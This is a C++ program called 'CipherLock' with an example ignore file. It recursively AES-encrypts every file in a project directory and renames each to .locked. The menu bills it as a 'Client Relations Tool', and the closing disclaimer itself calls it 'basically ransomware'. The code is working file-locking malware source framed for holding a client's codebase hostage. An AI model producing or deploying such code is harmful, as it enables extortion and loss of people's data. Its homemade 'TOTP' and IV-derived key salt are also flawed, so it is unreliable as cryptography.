The CipherLock: Client-Proof Codebase Encryptor 9000
----------------------------------------------------

``` C++
#include <iostream>
#include <fstream>
#include <filesystem>
#include <vector>
#include <chrono>
#include <thread>
#include <openssl/aes.h>
#include <openssl/evp.h>
#include <openssl/rand.h>
#include <regex>
#include <nlohmann/json.hpp>

using json = nlohmann::json;
namespace fs = std::filesystem;

class CodebaseVault {
private:
    std::string secret_key;
    bool armed = false;
    std::string vault_directory;
    
    // 🔥 GUI-like ASCII animations
    void display_laser_grid() {
        std::vector<std::string> frames = {
            "╔═══╦═══╦═══╗   ╔═══╦═══╦═══╗",
            "║ \\ ║   ║ / ║   ║ ║ ║   ║ ║ ║",
            "╠═══╬═══╬═══╣   ╠═══╬═══╬═══╣",
            "║   ║ X ║   ║   ║   ║ █ ║   ║",
            "╠═══╬═══╬═══╣   ╠═══╬═══╬═══╣",
            "║ / ║   ║ \\ ║   ║ ║ ║   ║ ║ ║",
            "╚═══╩═══╩═══╝   ╚═══╩═══╩═══╝"
        };
        
        for (int i = 0; i < 5; i++) {
            system("clear");
            std::cout << "\n🚨 LASER DEFENSE GRID ACTIVE 🚨\n";
            for (const auto& line : frames) {
                std::cout << line << std::endl;
            }
            std::this_thread::sleep_for(std::chrono::milliseconds(300));
            std::swap(frames[1], frames[5]);
            std::swap(frames[3][9], frames[3][11]);
        }
    }
    
    // 📁 Read .gitignore patterns
    std::vector<std::regex> read_ignore_patterns(const fs::path& dir) {
        std::vector<std::regex> patterns;
        fs::path ignore_file = dir / ".cipherignore"; // Our custom ignore
        
        if (!fs::exists(ignore_file)) {
            ignore_file = dir / ".gitignore";
        }
        
        if (fs::exists(ignore_file)) {
            std::ifstream file(ignore_file);
            std::string line;
            while (std::getline(file, line)) {
                if (!line.empty() && line[0] != '#') {
                    // Convert gitignore pattern to regex
                    std::string pattern = std::regex_replace(line, 
                        std::regex("\\*"), ".*");
                    pattern = std::regex_replace(pattern, 
                        std::regex("\\?"), ".");
                    patterns.push_back(std::regex(pattern));
                }
            }
        }
        
        // Default patterns to always ignore
        patterns.push_back(std::regex("\\.cipherlock"));
        patterns.push_back(std::regex("\\.git"));
        patterns.push_back(std::regex("\\.cipherignore"));
        
        return patterns;
    }
    
    // 🔐 AES-256 encryption
    bool encrypt_file(const fs::path& filepath, const std::string& password) {
        std::ifstream in(filepath, std::ios::binary);
        if (!in) return false;
        
        std::string content((std::istreambuf_iterator<char>(in)),
                           std::istreambuf_iterator<char>());
        in.close();
        
        // Generate IV
        unsigned char iv[AES_BLOCK_SIZE];
        RAND_bytes(iv, AES_BLOCK_SIZE);
        
        // Derive key from password using simple KDF
        unsigned char key[32];
        PKCS5_PBKDF2_HMAC_SHA1(password.c_str(), password.length(),
                              iv, 8, 10000, 32, key);
        
        // Encrypt
        EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
        EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv);
        
        std::vector<unsigned char> ciphertext(content.length() + AES_BLOCK_SIZE);
        int len = 0;
        int ciphertext_len = 0;
        
        EVP_EncryptUpdate(ctx, ciphertext.data(), &len,
                         (unsigned char*)content.c_str(), content.length());
        ciphertext_len = len;
        
        EVP_EncryptFinal_ex(ctx, ciphertext.data() + len, &len);
        ciphertext_len += len;
        ciphertext.resize(ciphertext_len);
        
        EVP_CIPHER_CTX_free(ctx);
        
        // Write encrypted file with IV prepended
        std::ofstream out(filepath, std::ios::binary);
        out.write((char*)iv, AES_BLOCK_SIZE);
        out.write((char*)ciphertext.data(), ciphertext.size());
        out.close();
        
        // Rename to .locked extension
        fs::rename(filepath, filepath.string() + ".locked");
        
        return true;
    }
    
    // 🔓 Decryption
    bool decrypt_file(const fs::path& filepath, const std::string& password) {
        std::ifstream in(filepath, std::ios::binary);
        if (!in) return false;
        
        // Read IV
        unsigned char iv[AES_BLOCK_SIZE];
        in.read((char*)iv, AES_BLOCK_SIZE);
        
        // Read ciphertext
        std::string ciphertext((std::istreambuf_iterator<char>(in)),
                              std::istreambuf_iterator<char>());
        in.close();
        
        // Derive key
        unsigned char key[32];
        PKCS5_PBKDF2_HMAC_SHA1(password.c_str(), password.length(),
                              iv, 8, 10000, 32, key);
        
        // Decrypt
        EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
        EVP_DecryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv);
        
        std::vector<unsigned char> plaintext(ciphertext.length() + AES_BLOCK_SIZE);
        int len = 0;
        int plaintext_len = 0;
        
        EVP_DecryptUpdate(ctx, plaintext.data(), &len,
                         (unsigned char*)ciphertext.c_str(), ciphertext.length());
        plaintext_len = len;
        
        EVP_DecryptFinal_ex(ctx, plaintext.data() + len, &len);
        plaintext_len += len;
        plaintext.resize(plaintext_len);
        
        EVP_CIPHER_CTX_free(ctx);
        
        // Remove .locked extension and write decrypted
        std::string original_path = filepath.string();
        original_path = original_path.substr(0, original_path.find(".locked"));
        
        std::ofstream out(original_path, std::ios::binary);
        out.write((char*)plaintext.data(), plaintext.size());
        out.close();
        
        // Delete locked file
        fs::remove(filepath);
        
        return true;
    }
    
    // 🎯 Check if file should be ignored
    bool should_ignore(const fs::path& filepath, 
                      const std::vector<std::regex>& patterns) {
        std::string filename = filepath.filename().string();
        std::string relative_path = fs::relative(filepath, vault_directory).string();
        
        for (const auto& pattern : patterns) {
            if (std::regex_match(filename, pattern) ||
                std::regex_match(relative_path, pattern)) {
                return true;
            }
        }
        return false;
    }

public:
    CodebaseVault() {
        // Generate a random secret on init
        unsigned char random_secret[16];
        RAND_bytes(random_secret, 16);
        secret_key = std::string((char*)random_secret, 16);
    }
    
    // ⚙️ Setup vault in directory
    void setup_vault(const std::string& directory) {
        vault_directory = directory;
        
        // Create config file
        json config;
        config["armed"] = false;
        config["setup_date"] = std::chrono::system_clock::now()
            .time_since_epoch().count();
        config["total_files"] = 0;
        
        std::ofstream config_file(directory + "/.cipherlock");
        config_file << config.dump(4);
        
        std::cout << "\n🔧 Vault initialized at: " << directory << std::endl;
        std::cout << "📝 Create a .cipherignore file to specify exclusions\n";
    }
    
    // 🔥 ARM the vault (encrypt everything)
    bool arm_vault(const std::string& password) {
        if (vault_directory.empty()) {
            std::cerr << "❌ No vault directory set!\n";
            return false;
        }
        
        std::cout << "\n⚡ ARMING VAULT - THIS ACTION IS IRREVERSIBLE ⚡\n";
        std::cout << "Type 'CONFIRM' to proceed: ";
        std::string confirmation;
        std::cin >> confirmation;
        
        if (confirmation != "CONFIRM") {
            std::cout << "Aborted.\n";
            return false;
        }
        
        display_laser_grid();
        
        auto patterns = read_ignore_patterns(vault_directory);
        int encrypted_count = 0;
        
        for (const auto& entry : fs::recursive_directory_iterator(vault_directory)) {
            if (entry.is_regular_file() && !should_ignore(entry.path(), patterns)) {
                if (encrypt_file(entry.path(), password)) {
                    encrypted_count++;
                    std::cout << "🔒 Locked: " 
                              << fs::relative(entry.path(), vault_directory) 
                              << std::endl;
                }
            }
        }
        
        armed = true;
        
        // Update config
        json config;
        config["armed"] = true;
        config["encryption_date"] = std::chrono::system_clock::now()
            .time_since_epoch().count();
        config["encrypted_files"] = encrypted_count;
        
        std::ofstream config_file(vault_directory + "/.cipherlock");
        config_file << config.dump(4);
        
        std::cout << "\n✅ VAULT ARMED: " << encrypted_count << " files encrypted\n";
        std::cout << "💀 Codebase is now LOCKED. TOTP required for access.\n";
        
        return true;
    }
    
    // 🔓 Disarm vault (decrypt everything)
    bool disarm_vault(const std::string& password) {
        if (!armed) {
            std::cout << "⚠️  Vault is not armed.\n";
            return true;
        }
        
        std::cout << "\n🔓 DISARMING VAULT\n";
        
        auto patterns = read_ignore_patterns(vault_directory);
        int decrypted_count = 0;
        
        for (const auto& entry : fs::recursive_directory_iterator(vault_directory)) {
            if (entry.is_regular_file() && 
                entry.path().extension() == ".locked" &&
                !should_ignore(entry.path(), patterns)) {
                if (decrypt_file(entry.path(), password)) {
                    decrypted_count++;
                    std::cout << "🔓 Unlocked: " 
                              << fs::relative(entry.path(), vault_directory) 
                              << std::endl;
                }
            }
        }
        
        armed = false;
        
        // Clear config
        fs::remove(vault_directory + "/.cipherlock");
        
        std::cout << "\n✅ VAULT DISARMED: " << decrypted_count << " files restored\n";
        std::cout << "🎉 Codebase is now accessible.\n";
        
        return true;
    }
    
    // 🎲 Generate TOTP (6-digit mode - for the "client-friendly" version 😈)
    std::string generate_totp() {
        auto now = std::chrono::system_clock::now();
        auto epoch = now.time_since_epoch();
        auto seconds = std::chrono::duration_cast<std::chrono::seconds>(epoch).count();
        
        // Simple "TOTP" - in reality, use proper HMAC
        int code = (seconds * std::hash<std::string>{}(secret_key)) % 1000000;
        
        std::stringstream ss;
        ss << std::setw(6) << std::setfill('0') << code;
        return ss.str();
    }
    
    // 💣 Brute-force simulator (for educational purposes!)
    void simulate_brute_force() {
        std::cout << "\n💣 SIMULATING BRUTE FORCE ATTACK\n";
        std::cout << "6-digit code space: 1,000,000 combinations\n";
        
        std::string correct_code = generate_totp();
        int attempts = 0;
        
        for (int i = 0; i < 1000000; i++) {
            std::string test_code = std::to_string(i);
            test_code = std::string(6 - test_code.length(), '0') + test_code;
            
            attempts++;
            
            if (attempts % 100000 == 0) {
                std::cout << "Attempt " << attempts << "...\n";
            }
            
            if (test_code == correct_code) {
                std::cout << "\n💥 CODE CRACKED after " << attempts << " attempts!\n";
                std::cout << "Correct code: " << correct_code << "\n";
                std::cout << "Time estimate: ~" << (attempts / 10) << " seconds @ 10 attempts/sec\n";
                return;
            }
        }
        
        std::cout << "\n❌ Failed to crack code (window expired)\n";
    }
};

// 🎬 Main menu with ASCII GUI
void display_menu() {
    system("clear");
    std::cout << R"(
    ╔══════════════════════════════════════════╗
    ║    C I P H E R L O C K   9 0 0 0         ║
    ║   "Client Relations Tool" 😉            ║
    ╠══════════════════════════════════════════╣
    ║                                          ║
    ║  1. Setup New Vault                      ║
    ║  2. Arm Vault (Encrypt Codebase)         ║
    ║  3. Disarm Vault (Decrypt Codebase)      ║
    ║  4. Generate Current TOTP                ║
    ║  5. Simulate Brute Force                 ║
    ║  6. View Vault Status                    ║
    ║  7. Exit                                 ║
    ║                                          ║
    ╚══════════════════════════════════════════╝
    
    )";
}

int main() {
    OpenSSL_add_all_algorithms();
    
    CodebaseVault vault;
    std::string current_directory = fs::current_path().string();
    
    while (true) {
        display_menu();
        std::cout << "Select option: ";
        int choice;
        std::cin >> choice;
        
        switch (choice) {
            case 1: {
                std::cout << "Enter directory path (or . for current): ";
                std::string dir;
                std::cin >> dir;
                if (dir == ".") dir = current_directory;
                vault.setup_vault(dir);
                break;
            }
            case 2: {
                std::cout << "Enter encryption password: ";
                std::string password;
                std::cin >> password;
                vault.arm_vault(password);
                break;
            }
            case 3: {
                std::cout << "Enter decryption password: ";
                std::string password;
                std::cin >> password;
                vault.disarm_vault(password);
                break;
            }
            case 4: {
                std::cout << "\n🔑 Current TOTP: " << vault.generate_totp() << std::endl;
                std::cout << "⚠️  Valid for 60 seconds\n";
                break;
            }
            case 5:
                vault.simulate_brute_force();
                break;
            case 6: {
                std::cout << "\n📊 Vault Status:\n";
                std::cout << "Location: " << current_directory << std::endl;
                std::cout << "Current TOTP: " << vault.generate_totp() << std::endl;
                break;
            }
            case 7:
                std::cout << "\n🚪 Exiting... Remember: With great power...\n";
                return 0;
            default:
                std::cout << "Invalid option!\n";
        }
        
        std::cout << "\nPress Enter to continue...";
        std::cin.ignore();
        std::cin.get();
    }
    
    EVP_cleanup();
    return 0;
}

```

Example `.cipherignore`:

```text
*.jpg
*.png
*.pdf
config/
database/
*.env
*.config.json
README.md

```


WARNING & DISCLAIMER
====================
**THIS IS FOR EDUCATIONAL/VIBING PURPOSES ONLY!**
- DO NOT USE ON REAL CLIENT PROJECTS (That's illegal/unethical)
-  KEEP BACKUPS (Seriously, test in VM only)
- 6-DIGIT TOTP IS WEAK (Real system would use proper 256-bit keys)
- THIS IS BASICALLY RANSOMWARE (But for vibing)



